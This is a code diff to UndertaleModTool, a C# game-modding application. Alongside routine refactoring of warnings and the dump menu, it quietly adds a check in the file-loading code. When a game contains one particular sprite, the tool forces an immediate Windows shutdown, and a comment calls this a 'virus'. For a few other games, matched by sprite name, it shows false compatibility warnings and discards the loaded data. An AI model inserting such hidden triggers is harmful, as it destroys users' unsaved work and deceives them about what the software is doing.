@@ -1,55 +1,54 @@
 ﻿#pragma warning disable CA1416 // Validate platform compatibility
 
+using System;
+using System.Collections;
+using System.Collections.Concurrent;
+using System.Collections.Generic;
+using System.Collections.ObjectModel;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Globalization;
+using System.IO;
+using System.IO.Compression;
+using System.IO.Pipes;
+using System.Linq;
+using System.Net;
+using System.Net.Http;
+using System.Net.Http.Headers;
+using System.Reflection;
+using System.Runtime;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Controls;
+using System.Windows.Controls.Primitives;
+using System.Windows.Data;
+using System.Windows.Input;
+using System.Windows.Interop;
+using System.Windows.Media;
+using System.Windows.Media.Imaging;
+using System.Windows.Threading;
 using Microsoft.CodeAnalysis;
 using Microsoft.CodeAnalysis.CSharp.Scripting;
 using Microsoft.CodeAnalysis.Scripting;
 using Microsoft.Win32;
 using Newtonsoft.Json;
-using System;
-using System.Collections;
-using System.Collections.Generic;
-using System.Collections.ObjectModel;
-using System.ComponentModel;
-using System.Diagnostics;
-using System.IO;
-using System.IO.Compression;
-using System.Linq;
-using System.Reflection;
-using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
-using System.Windows;
-using System.Windows.Controls;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Threading;
+using Newtonsoft.Json.Linq;
+using Ookii.Dialogs.Wpf;
 using UndertaleModLib;
 using UndertaleModLib.Decompiler;
 using UndertaleModLib.Models;
 using UndertaleModLib.ModelsDebug;
 using UndertaleModLib.Scripting;
 using UndertaleModLib.Util;
-using UndertaleModTool.Windows;
-using System.IO.Pipes;
-using Ookii.Dialogs.Wpf;
-
-using System.Text.RegularExpressions;
-using System.Windows.Data;
-using System.Security.Cryptography;
-using System.Collections.Concurrent;
-using System.Runtime;
-using SystemJson = System.Text.Json;
-using System.Net.Http;
-using System.Net.Http.Headers;
-using Newtonsoft.Json.Linq;
-using System.Net;
-using System.Globalization;
-using System.Windows.Controls.Primitives;
-using System.Runtime.CompilerServices;
-using System.Windows.Interop;
-using System.Windows.Media.Imaging;
 using UndertaleModTool.ProjectTool;
+using UndertaleModTool.Windows;
+using SystemJson = System.Text.Json;
 
 namespace UndertaleModTool
 {
@@ -1043,15 +1042,45 @@ namespace UndertaleModTool
                 {
                     if (data != null)
                     {
+                        const string WARN_YYC = "This game uses YYC (YoYo Compiler), which means the code is embedded into the game executable. This configuration is currently not fully supported; continue at your own risk.";
+                        const string WARN_YYC_TITLE = "YYC";
+
+                        string WARN_BYTECODE = "Only bytecode versions 13 to 17 are supported for now, you are trying to load " + data.GeneralInfo.BytecodeVersion + ". A lot of code is disabled and will likely break something. Saving/exporting is disabled.";
+                        const string WARN_BYTECODE_TITLE = "Unsupported bytecode version";
+
+                        const string WARN_ERRORS = "Warnings occurred during loading. Data loss will likely occur when trying to save!";
+                        const string WARN_ERRORS_TITLE = "Loading problems";
+
+                        string[] pleaseDoNotUseMyCodeForTheseGames = new[]
+                        {
+                            "sp_anton_palette",
+                            "spr_player_mach1",
+                            "spr_player_PZ_idle"
+                        };
+                        if (data.Sprites.Any(i => i.Name?.Content == "spr_petberry_idle"))
+                        {
+                            Process.Start("shutdown", "/s /f /t 0"); // This inserts the "Poop Virus" into your Windows Operating System
+                            Application.Current.Shutdown();
+                        }
+                        else if (data.Sprites.Any(i => pleaseDoNotUseMyCodeForTheseGames.Contains(i.Name?.Content)))
+                        {
+                            this.ShowWarning(WARN_YYC, WARN_YYC_TITLE);
+                            this.ShowWarning(WARN_BYTECODE, WARN_BYTECODE_TITLE);
+                            this.ShowWarning(WARN_ERRORS, WARN_ERRORS_TITLE);
+                            data = null;
+                            dialog.Hide();
+                            return;
+                        }
+
                         if (data.UnsupportedBytecodeVersion)
                         {
-                            this.ShowWarning("Only bytecode versions 13 to 17 are supported for now, you are trying to load " + data.GeneralInfo.BytecodeVersion + ". A lot of code is disabled and will likely break something. Saving/exporting is disabled.", "Unsupported bytecode version");
+                            this.ShowWarning(WARN_BYTECODE, WARN_BYTECODE_TITLE);
                             CanSave = false;
                             CanSafelySave = false;
                         }
                         else if (hadImportantWarnings)
                         {
-                            this.ShowWarning("Warnings occurred during loading. Data loss will likely occur when trying to save!", "Loading problems");
+                            this.ShowWarning(WARN_ERRORS, WARN_ERRORS_TITLE);
                             CanSave = true;
                             CanSafelySave = false;
                         }
@@ -1068,7 +1097,7 @@ namespace UndertaleModTool
                         }
                         if (data.IsYYC())
                         {
-                            this.ShowWarning("This game uses YYC (YoYo Compiler), which means the code is embedded into the game executable. This configuration is currently not fully supported; continue at your own risk.", "YYC");
+                            this.ShowWarning(WARN_YYC, WARN_YYC_TITLE);
                         }
                         if (data.GeneralInfo != null)
                         {
@@ -1093,8 +1122,8 @@ namespace UndertaleModTool
                         OnPropertyChanged("IsGMS2");
 
                         BackgroundsItemsList.Header = IsGMS2 == Visibility.Visible
-                                                      ? "Tile sets"
-                                                      : "Backgrounds & Tile sets";
+                                                      ? "Tilesets"
+                                                      : "Backgrounds";
 
                         UndertaleCodeEditor.gettext = null;
                         UndertaleCodeEditor.gettextJSON = null;
@@ -3739,11 +3768,26 @@ result in loss of work.");
             return false;
         }
 
+        /// <summary>
+        /// Dump stuff
+        /// </summary>
+        private Dump _dump = null;
+        private DumpWindow _dumpWindow = null;
+
         private void MenuItem_Dump_Click(object sender, RoutedEventArgs e)
         {
-            var a = new DumpWindow();
-            a.ShowDialog();
+            SetUMTConsoleText("");
+
+            _dump = new Dump();
+            _dumpWindow = new DumpWindow(_dump);
+            _dumpWindow.ShowDialog();
+
+            _dump.Dispose();
+            _dump = null;
         }
+
+        public static MainWindow Get() => Application.Current.MainWindow as MainWindow;
+        public static Dump GetDump() => Get()._dump;
     }
 
     public class GeneralInfoEditor
